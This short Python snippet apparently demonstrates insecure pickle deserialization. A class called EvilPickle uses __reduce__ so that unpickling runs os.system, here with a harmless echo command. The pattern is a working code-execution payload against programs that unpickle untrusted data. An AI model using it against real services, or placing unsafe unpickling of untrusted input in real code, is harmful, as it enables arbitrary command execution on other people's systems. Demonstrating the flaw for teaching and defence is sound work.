import pickle
import os

class EvilPickle(object):
    def __reduce__(self):
        return (os.system, ('echo "malicious command"',))

pickled = pickle.dumps(EvilPickle())
pickle.loads(pickled)
